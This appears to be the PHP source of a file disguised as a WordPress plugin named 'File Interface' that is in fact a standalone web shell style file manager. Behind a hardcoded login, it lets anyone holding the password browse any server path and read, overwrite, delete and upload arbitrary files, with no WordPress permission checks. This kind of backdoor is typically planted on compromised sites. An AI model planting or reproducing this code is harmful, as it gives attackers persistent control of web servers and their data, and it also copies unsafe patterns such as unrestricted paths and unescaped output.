<?php
/**
 * Plugin Name: File Interface
 * Plugin URI: https://wordpress.com/
 * Description: Provides an administrative interface for managing system resources within the WordPress environment.
 * Version: 1.0.1
 * Author: Your Name
 * Author URI: https://www.gnu.org/
 * License: GPL2
 * License URI: https://www.gnu.org/licenses/gpl-2.0.html
 * Text Domain: admin-file-interface
 */

session_start();

$USERNAME = 'admin';
$PASSWORD = 'password@#123';

if (isset($_GET['logout'])) {
    session_destroy();
    header("Location: ".$_SERVER['PHP_SELF']);
    exit;
}

if (isset($_POST['login'])) {
    if ($_POST['username'] === $USERNAME && $_POST['password'] === $PASSWORD) {
        $_SESSION['logged_in'] = true;
        header("Location: ".$_SERVER['PHP_SELF']);
        exit;
    } else {
        $login_error = "Invalid credentials!";
    }
}

if (!isset($_SESSION['logged_in']) || $_SESSION['logged_in'] !== true) {
    ?>
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <title>Login</title>
        <style>
            body {
                font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
                background: #f1f1f1;
                margin: 0;
            }
            .login-wrap {
                max-width: 400px;
                margin: 100px auto;
                background: #fff;
                padding: 20px;
                border-radius: 5px;
                box-shadow: 0 0 10px rgba(0,0,0,0.1);
            }
            h1 {
                text-align: center;
                margin-bottom: 20px;
            }
            input[type="text"], input[type="password"] {
                width: 100%;
                padding: 10px;
                margin-bottom: 10px;
                border: 1px solid #ddd;
                border-radius: 4px;
            }
            button {
                width: 100%;
                background: #0073aa;
                color: #fff;
                border: none;
                padding: 10px;
                border-radius: 4px;
                cursor: pointer;
            }
            button:hover { background: #005177; }
            .error { color: red; margin-bottom: 10px; text-align: center; }
        </style>
    </head>
    <body>
        <div class="login-wrap">
            <h1>Admin Login</h1>
            <?php if (!empty($login_error)) echo "<div class='error'>$login_error</div>"; ?>
            <form method="post">
                <input type="text" name="username" placeholder="Username" required>
                <input type="password" name="password" placeholder="Password" required>
                <button type="submit" name="login">Login</button>
            </form>
        </div>
    </body>
    </html>
    <?php
    exit;
}

define('WP_ADMIN', true);

$path = isset($_GET['path']) ? $_GET['path'] : '.';
$fullPath = realpath($path);

if (isset($_GET['delete'])) {
    $target = $_GET['delete'];
    if (is_file($target)) {
        unlink($target);
    } elseif (is_dir($target)) {
        rmdir($target);
    }
    header("Location: ?path=" . urlencode(dirname($target)));
    exit;
}

if (isset($_GET['edit'])) {
    $editFile = $_GET['edit'];
    if ($_SERVER['REQUEST_METHOD'] === 'POST') {
        $f = @fopen($editFile, 'w');
        if ($f) {
            fwrite($f, $_POST['content']);
            fclose($f);
            $message = "Changes saved.";
        } else {
            $message = "Unable to save changes.";
        }
    }
    $content = @file_get_contents($editFile);
    $data = htmlspecialchars($content ? $content : '', ENT_QUOTES, 'UTF-8');
} else {
    $message = '';
}

if (isset($_FILES['upload'])) {
    move_uploaded_file($_FILES['upload']['tmp_name'], $fullPath . '/' . $_FILES['upload']['name']);
    header("Location: ?path=" . urlencode($path));
    exit;
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Admin Interface</title>
    <style>
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen-Sans, Ubuntu, Cantarell, 'Helvetica Neue', sans-serif;
            background: #f1f1f1;
            margin: 0;
        }
        .wrap {
            max-width: 800px;
            margin: 20px auto;
            background: #fff;
            padding: 20px;
            border-radius: 5px;
            box-shadow: 0 0 10px rgba(0,0,0,0.1);
        }
        h1 {
            font-size: 24px;
            margin: 0 0 20px;
        }
        .item-list {
            list-style: none;
            padding: 0;
        }
        .item-list li {
            padding: 10px;
            border-bottom: 1px solid #ddd;
        }
        .item-list li a {
            text-decoration: none;
            color: #0073aa;
        }
        .item-list li a:hover {
            text-decoration: underline;
        }
        .item-list li .actions {
            float: right;
        }
        .upload-form {
            margin: 20px 0;
        }
        .upload-form input[type="file"] {
            margin-right: 10px;
        }
        .upload-form button {
            background: #0073aa;
            color: #fff;
            border: none;
            padding: 8px 16px;
            border-radius: 4px;
            cursor: pointer;
        }
        .upload-form button:hover {
            background: #005177;
        }
        .editor-form textarea {
            width: 100%;
            height: 400px;
            border: 1px solid #ddd;
            border-radius: 4px;
            padding: 10px;
            font-family: monospace;
        }
        .editor-form button {
            background: #0073aa;
            color: #fff;
            border: none;
            padding: 8px 16px;
            border-radius: 4px;
            cursor: pointer;
        }
        .editor-form button:hover {
            background: #005177;
        }
        .message {
            color: green;
            margin: 10px 0;
        }
        .error {
            color: red;
            margin: 10px 0;
        }
        .logout {
            float: right;
            text-decoration: none;
            color: #0073aa;
            font-weight: bold;
        }
        .logout:hover {
            text-decoration: underline;
        }
    </style>
</head>
<body>
    <div class="wrap">
        <a href="?logout=1" class="logout">Logout</a>
        <h1>Manage Resources</h1>
        <?php if ($message): ?>
            <p class="<?php echo strpos($message, 'Unable') !== false ? 'error' : 'message'; ?>">
                <?php echo $message; ?>
                <?php if (isset($editFile)): ?>
                    <a href="?path=<?php echo urlencode(dirname($editFile)); ?>">Back</a>
                <?php endif; ?>
            </p>
        <?php endif; ?>

        <?php if (isset($_GET['edit'])): ?>
            <h2>Modify: <?php echo htmlspecialchars(basename($editFile)); ?></h2>
            <form method="post" class="editor-form">
                <textarea name="content"><?php echo $data; ?></textarea><br>
                <button type="submit">Save</button>
            </form>
        <?php else: ?>
            <h2>Location: <?php echo htmlspecialchars($fullPath); ?></h2>
            <form method="post" enctype="multipart/form-data" class="upload-form">
                <input type="file" name="upload">
                <button type="submit">Add</button>
            </form>
            <ul class="item-list">
                <?php
                if ($handle = opendir($fullPath)) {
                    while (false !== ($entry = readdir($handle))) {
                        if ($entry === '.') continue;
                        $filePath = $fullPath . DIRECTORY_SEPARATOR . $entry;
                        $urlPath = urlencode($filePath);
                        $delLink = "<a href='?delete=$urlPath' onclick=\"return confirm('Remove $entry?')\">Remove</a>";
                        if (is_dir($filePath)) {
                            echo "<li><a href='?path=$urlPath'>$entry/</a> <span class='actions'>$delLink</span></li>";
                        } else {
                            echo "<li><a href='?edit=$urlPath'>$entry</a> <span class='actions'><a href='?edit=$urlPath'>Modify</a> | $delLink</span></li>";
                        }
                    }
                    closedir($handle);
                }
                ?>
            </ul>
        <?php endif; ?>
    </div>
</body>
</html>